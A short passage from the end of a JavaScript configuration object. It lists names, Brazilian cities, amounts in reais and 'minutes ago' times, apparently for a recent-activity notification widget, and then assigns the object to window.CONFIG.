      { name: "Igor V.", location: "Porto Velho, RO", amount: "R$ 278,45", time: "há 24 min" },
      { name: "Bianca C.", location: "Blumenau, SC", amount: "R$ 310,50", time: "há 25 min" },
      { name: "Renan S.", location: "Piracicaba, SP", amount: "R$ 278,45", time: "há 26 min" }
    ]
  }
};

window.CONFIG = CONFIG;
